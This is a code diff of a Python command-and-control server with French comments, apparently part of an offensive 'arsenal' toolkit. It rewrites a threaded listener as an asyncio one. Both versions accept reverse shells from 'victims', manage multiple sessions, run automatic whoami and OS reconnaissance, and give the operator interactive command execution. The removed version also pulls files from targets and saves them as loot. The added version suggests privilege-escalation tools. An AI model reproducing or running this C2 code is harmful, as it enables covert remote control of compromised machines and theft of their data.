@@ -1,151 +1,165 @@
-import socket
-import threading
+import asyncio
 import os
-import time
-from core.reporter import add_finding
+import sys
 
-class GigaC2:
-    def __init__(self, host='0.0.0.0', port=4444):
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.host = host
-        self.port = port
-        self.sessions = {}
-        self.session_count = 0
-        self.running = True
+# Dictionnaire pour stocker les victimes compromises
+sessions = {}
+session_counter = 1
 
-    def listen_for_clients(self):
-        """1. MULTI-SESSION : Tourne en arrière-plan pour écouter les nouvelles victimes."""
-        try:
-            self.server.bind((self.host, self.port))
-            self.server.listen(5)
-            print(f"[*] C2 en écoute sur {self.host}:{self.port}...")
-        except Exception as e:
-            print(f"[-] Erreur de liaison: {e}")
-            self.running = False
-            return
-
-        while self.running:
-            try:
-                client_soc, addr = self.server.accept()
-                self.session_count += 1
-                session_id = self.session_count
-                
-                # On stocke la victime dans le dictionnaire des sessions
-                self.sessions[session_id] = {"socket": client_soc, "addr": addr, "info": "Inconnu"}
-                
-                print(f"\n[\033[92m+\033[0m] BINGO ! Nouvelle victime connectée : Session {session_id} ({addr[0]})")
-                add_finding("C2 Server", addr[0], f"Reverse Shell établi - Session {session_id}")
-                
-                # 3. AUTOMATISATION : On lance la reconnaissance instantanée
-                threading.Thread(target=self.auto_recon, args=(session_id, client_soc)).start()
-                
-            except Exception:
-                break
-
-    def auto_recon(self, session_id, client_soc):
-        """Exécute des commandes de base dès la connexion pour profiler la cible."""
-        try:
-            time.sleep(1) # Laisse le temps à la connexion de se stabiliser
-            client_soc.send(b"whoami\n")
-            user_info = client_soc.recv(1024).decode(errors='replace').strip()
-            if user_info:
-                self.sessions[session_id]["info"] = user_info
-                print(f"[\033[94m*\033[0m] Session {session_id} identifiée comme : {user_info}")
-        except:
-            pass
-
-    def interact(self, session_id):
-        """Prend le contrôle exclusif d'une session."""
-        session = self.sessions.get(session_id)
-        if not session:
-            print("[-] Session introuvable ou déconnectée.")
-            return
-
-        soc = session["socket"]
-        print(f"\n[\033[93m*\033[0m] Prise de contrôle de la Session {session_id}. Tapez 'background' pour cacher.")
+async def auto_privesc(reader, writer, session_id):
+    """Phase de reconnaissance furtive dès la connexion de la cible."""
+    print(f"\n[\033[94m*\033[0m] [Session {session_id}] Lancement de l'Auto-Reconnaissance...")
+    
+    try:
+        # 1. Qui sommes-nous ? (Windows & Linux comprennent 'whoami')
+        writer.write(b"whoami\n")
+        await writer.drain()
+        user = (await reader.read(1024)).decode(errors='ignore').strip()
         
+        # 2. Détection de l'OS (Approche furtive)
+        writer.write(b"echo %OS% $OSTYPE\n") 
+        await writer.drain()
+        os_env = (await reader.read(1024)).decode(errors='ignore').strip()
+        
+        is_windows = "Windows" in os_env or "%OS%" not in os_env
+        
+        print(f"[\033[92m+\033[0m] [Session {session_id}] Identité confirmée : \033[1m{user}\033[0m")
+        
+        # 3. Évaluation des privilèges
+        if is_windows:
+            if "nt authority\\system" in user.lower() or "administrateur" in user.lower() or "administrator" in user.lower():
+                print(f"[\033[92m+\033[0m] [Session {session_id}] BINGO ! Vous êtes déjà SYSTEM (Dieu sur la machine).")
+            else:
+                print(f"[\033[93m!\033[0m] [Session {session_id}] OS : Windows | Accès Standard.")
+                print(f"    -> Prêt pour l'élévation. Préparez WinPEAS ou un module de contournement UAC.")
+        else:
+            if "root" in user.lower():
+                 print(f"[\033[92m+\033[0m] [Session {session_id}] BINGO ! Vous êtes root.")
+            else:
+                 print(f"[\033[93m!\033[0m] [Session {session_id}] OS : Linux | Accès Standard.")
+                 print(f"    -> Pensez à vérifier 'sudo -l' ou à lancer LinPEAS.")
+
+        # On rafraîchit le prompt du C2 pour l'utilisateur
+        print("C2> ", end="", flush=True)
+        
+    except Exception as e:
+        print(f"[-] Erreur lors de la reconnaissance sur la session {session_id} : {e}")
+
+async def handle_client(reader, writer):
+    """Gère une nouvelle victime qui vient de se faire pirater."""
+    global session_counter
+    session_id = session_counter
+    session_counter += 1
+    
+    addr = writer.get_extra_info('peername')
+    print(f"\n[\033[92m+\033[0m] Nouvelle cible compromise depuis {addr[0]}:{addr[1]} (Attribution Session ID: {session_id})")
+    
+    # On ajoute la victime dans notre tableau de chasse
+    sessions[session_id] = (reader, writer)
+    
+    # On lance l'auto-reconnaissance sans bloquer le reste du C2
+    asyncio.create_task(auto_privesc(reader, writer, session_id))
+    
+    # Boucle de maintien en vie de la connexion
+    try:
         while True:
-            try:
-                cmd = input(f"\033[91m(Session {session_id} - {session['info']}) > \033[0m")
-                if cmd.strip() == "background":
-                    break
-                if not cmd.strip():
-                    continue
+            data = await reader.read(1024)
+            if not data:
+                break # La victime s'est déconnectée
+    except Exception:
+        pass
+    finally:
+        print(f"\n[-] Perte du signal avec la cible {session_id} ({addr[0]}).")
+        if session_id in sessions:
+            del sessions[session_id]
+        print("C2> ", end="", flush=True)
 
-                # 2. UPLOAD / DOWNLOAD : Interception des commandes de transfert
-                if cmd.startswith("download "):
-                    filename = cmd.split(" ", 1)[1]
-                    print(f"[*] Ordre de téléchargement envoyé pour : {filename}")
-                    soc.send(cmd.encode() + b"\n")
-                    
-                    # On reçoit le fichier (simplifié pour l'exemple)
-                    data = soc.recv(4096 * 10) 
-                    with open(f"loot_{filename}", "wb") as f:
-                        f.write(data)
-                    print(f"[\033[92m+\033[0m] Fichier volé et sauvegardé sous loot_{filename}")
-                    add_finding("C2 Exfiltration", session['addr'][0], f"Fichier exfiltré : **{filename}**")
-                    continue
-                    
-                elif cmd.startswith("upload "):
-                    filename = cmd.split(" ", 1)[1]
-                    if not os.path.exists(filename):
-                        print(f"[-] Fichier local '{filename}' introuvable.")
-                        continue
-                    
-                    print(f"[*] Upload de {filename} en cours...")
-                    soc.send(cmd.encode() + b"\n")
-                    time.sleep(0.5)
-                    with open(filename, "rb") as f:
-                        soc.send(f.read())
-                    print("[\033[92m+\033[0m] Fichier injecté sur la cible.")
-                    continue
-
-                # Exécution système classique
-                soc.send(cmd.encode() + b"\n")
-                response = soc.recv(8192).decode(errors='replace')
-                print(response, end="")
-                
-            except Exception as e:
-                print(f"\n[-] Connexion perdue avec la cible. ({e})")
-                del self.sessions[session_id]
-                break
-
-    def run(self):
-        # Le listener tourne en tâche de fond (daemon)
-        listener_thread = threading.Thread(target=self.listen_for_clients, daemon=True)
-        listener_thread.start()
+async def c2_shell():
+    """L'interface de commande locale pour le Hacker (Toi)."""
+    await asyncio.sleep(0.5)
+    print("\n[\033[94m*\033[0m] Console C2 active. Tapez 'help' pour la liste des ordres.")
+    
+    while True:
+        # asyncio.to_thread empêche le input() de geler le serveur
+        cmd = await asyncio.to_thread(input, "C2> ")
+        cmd = cmd.strip()
         
-        time.sleep(0.5)
-        print("\n\033[91m\033[1m=== GIGA C2 MULTI-SESSIONS ACTIF ===\033[0m")
-        print("Commandes : \033[96mlist\033[0m, \033[96minteract <id>\033[0m, \033[96mexit\033[0m")
-
-        while self.running:
+        if not cmd: continue
+        
+        if cmd.lower() in ['exit', 'quit']:
+            print("[*] Arrêt du serveur Command & Control...")
+            os._exit(0)
+            
+        elif cmd.lower() == 'sessions':
+            print("\n\033[1m--- Cibles Actives ---\033[0m")
+            if not sessions:
+                print("Aucune machine sous contrôle actuellement.")
+            for sid, (r, w) in sessions.items():
+                addr = w.get_extra_info('peername')
+                print(f"  [ID: {sid}] -> {addr[0]}:{addr[1]}")
+            print("----------------------\n")
+            
+        elif cmd.lower().startswith('interact'):
+            parts = cmd.split()
+            if len(parts) < 2:
+                print("[-] Usage : interact <id_session>")
+                continue
             try:
-                choice = input("\nC2-Main > ").strip().split()
-                if not choice: continue
+                sid = int(parts[1])
+                if sid not in sessions:
+                    print(f"[-] Session {sid} inexistante ou morte.")
+                    continue
                 
-                cmd = choice[0]
-                if cmd == "list":
-                    print("\n--- Sessions Actives ---")
-                    if not self.sessions:
-                        print("Aucune victime connectée.")
-                    for sid, info in self.sessions.items():
-                        print(f"  [\033[92mID: {sid}\033[0m] IP: {info['addr'][0]} | User: {info['info']}")
-                    print("------------------------")
-                elif cmd == "interact" and len(choice) > 1:
-                    self.interact(int(choice[1]))
-                elif cmd == "exit":
-                    print("[*] Fermeture du C2. Destruction des sessions...")
-                    self.running = False
-                    self.server.close()
-                    break
-                else:
-                    print("[-] Commande inconnue.")
-            except KeyboardInterrupt:
-                break
+                print(f"[*] Entrée dans la machine cible {sid}. Tapez 'background' pour revenir au C2.")
+                r, w = sessions[sid]
+                
+                # Boucle d'interaction avec la victime
+                while True:
+                    shell_cmd = await asyncio.to_thread(input, f"\033[91mVictime[{sid}]\033[0m> ")
+                    if shell_cmd.lower() == 'background':
+                        print("[*] Session mise en attente (elle reste connectée).")
+                        break
+                    
+                    w.write((shell_cmd + '\n').encode())
+                    await w.drain()
+                    
+                    try:
+                        # On attend la réponse de la commande système
+                        response = await asyncio.wait_for(r.read(8192), timeout=5.0)
+                        print(response.decode(errors='ignore').strip())
+                    except asyncio.TimeoutError:
+                        print("[-] Délai d'attente dépassé (la commande tourne peut-être encore).")
+                        
+            except ValueError:
+                print("[-] L'ID doit être un chiffre.")
+
+        elif cmd.lower() == 'help':
+            print("\n\033[1m--- Arsenal C2 ---\033[0m")
+            print("  sessions         : Affiche toutes les machines piratées")
+            print("  interact <id>    : Prend le contrôle terminal d'une victime")
+            print("  background       : (Pendant l'interaction) Revient au C2")
+            print("  exit             : Coupe tout et ferme le framework")
+            print("------------------\n")
+        else:
+            print(f"[-] Commande C2 inconnue. Tapez 'help'.")
+
+async def start_c2(port):
+    """Démarre le socket serveur asynchrone."""
+    print(f"[*] Démarrage du centre de commandement sur le port {port}...")
+    server = await asyncio.start_server(handle_client, '0.0.0.0', port)
+    
+    addr = server.sockets[0].getsockname()
+    print(f"[\033[92m+\033[0m] C2 en écoute silencieuse sur {addr[0]}:{addr[1]}")
+
+    # On fait tourner le serveur réseau ET notre interface de commande en même temps
+    await asyncio.gather(
+        server.serve_forever(),
+        c2_shell()
+    )
 
 def run_c2(args):
-    """Wrapper pour arsenal.py"""
-    c2 = GigaC2(port=args.port)
-    c2.run()
+    """Wrapper pour ton fichier arsenal.py"""
+    try:
+        asyncio.run(start_c2(args.port))
+    except KeyboardInterrupt:
+        pass
